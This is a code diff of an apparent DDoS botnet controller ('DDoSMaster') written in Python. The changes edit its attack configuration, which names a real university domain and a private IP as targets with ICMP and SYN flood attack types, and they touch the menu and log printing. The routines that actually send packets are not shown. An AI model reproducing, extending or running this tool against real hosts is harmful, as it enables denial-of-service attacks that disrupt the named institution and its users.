@@ -33,9 +33,9 @@ class DDoSMaster:
         self.botnets = self.getBotNetList()
         self.message = {
             "type": "attack",  # "attack" or "stop"
-            "target_ip": ["igracias.telkomuniversity.ac.id", "telkomuniversity.ac.id"],
+            "target_ip": ["igracias.telkomuniversity.ac.id", "192.168.1.1"],
             "attack_type": ["icmp", "syn"],
-            "number_of_attack": 1000
+            "number_of_attack": 4
         }
         self.bot_thread = []
         self.log = []
@@ -48,7 +48,7 @@ class DDoSMaster:
             target_idx = random.randint(0, n_targets-1)
             type_idx = random.randint(0, n_type-1)
             if self.message["type"] == "attack":
-                print(bot + " --attacking with " + self.message["target_ip"][target_idx] + "--> " +
+                print(bot + " --attacking with " + self.message["attack_type"][type_idx] + "--> " +
                       self.message["target_ip"][target_idx])
             elif self.message["type"] == "stop":
                 print(bot + " --stop attacking--X " +
@@ -164,6 +164,7 @@ if __name__ == '__main__':
         print("4. Change Attack Option")
         print("5. View Attack Option")
         print("6. View Log")
+        print("Exit: CTRL+Z")
         print("Select: ", end="")
         menu = str(input())
         os.system("cls")
